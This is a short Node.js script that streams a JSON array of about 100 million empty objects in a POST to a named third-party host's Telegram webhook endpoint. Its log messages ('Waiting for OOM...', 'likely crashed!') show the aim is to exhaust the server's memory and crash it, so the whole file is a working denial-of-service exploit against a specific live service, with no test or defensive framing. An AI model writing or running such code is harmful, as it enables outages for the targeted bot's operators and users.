const http = require('http');
const https = require('https');

const req = https.request({
  hostname: 'groza-bot.alwaysdata.net',
  path: '/api/telegram-webhook-8516017309%0D',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  }
}, (res) => {
  console.log('Status:', res.statusCode);
  res.on('data', (d) => process.stdout.write(d));
});

req.on('error', (e) => {
  console.error('Request error (likely crashed!):', e.message);
});

console.log('Building payload...');
req.write('[');
const chunk = '{}' + ',{}'.repeat(50000); // 50,000 objects per chunk
for (let i = 0; i < 2000; i++) { // 2000 chunks = 100 million objects
  req.write(i === 0 ? chunk : ',' + chunk);
}
req.write(']');
req.end();
console.log('Finished writing 100 million objects payload. Waiting for OOM...');
